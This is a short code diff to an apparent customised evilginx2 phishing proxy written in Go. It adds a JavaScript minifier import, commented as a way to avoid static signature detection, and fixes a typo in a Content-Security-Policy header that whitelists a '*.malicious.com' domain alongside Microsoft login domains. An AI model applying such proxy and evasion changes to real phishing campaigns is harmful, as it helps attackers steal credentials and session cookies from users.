@@ -40,6 +40,7 @@ import (
 	"github.com/inconshreveable/go-vhost"
 	http_dialer "github.com/mwitkow/go-http-dialer"
 	// added to avoid static js sign detection
+	"github.com/tdewolff/minify"
 	"github.com/tdewolff/minify/js"
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -894,7 +895,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// rimosso header referer to prevent malicious sites from knowing the original site
 			resp.Header.Set("Referrer-Policy", "no-referrer")
 			// CSP header for microsoft applied to every request, to be checked/modified or removed for everty test
-			resp.Headear.Set("Content-Security-Policy", "default-src 'self' data: 'unsafe-inline' 'unsafe-hashes' 'unsafe-eval' *.malicious.com aadcdn.msauthimages.net aadcdn.msftauthimages.net aadcdn.msauth.net *.live.com *.office.com *.office.net *.microsoft.com")
+			resp.Header.Set("Content-Security-Policy", "default-src 'self' data: 'unsafe-inline' 'unsafe-hashes' 'unsafe-eval' *.malicious.com aadcdn.msauthimages.net aadcdn.msftauthimages.net aadcdn.msauth.net *.live.com *.office.com *.office.net *.microsoft.com")
 			// handle session
 			ck := &http.Cookie{}
 			ps := ctx.UserData.(*ProxySession)
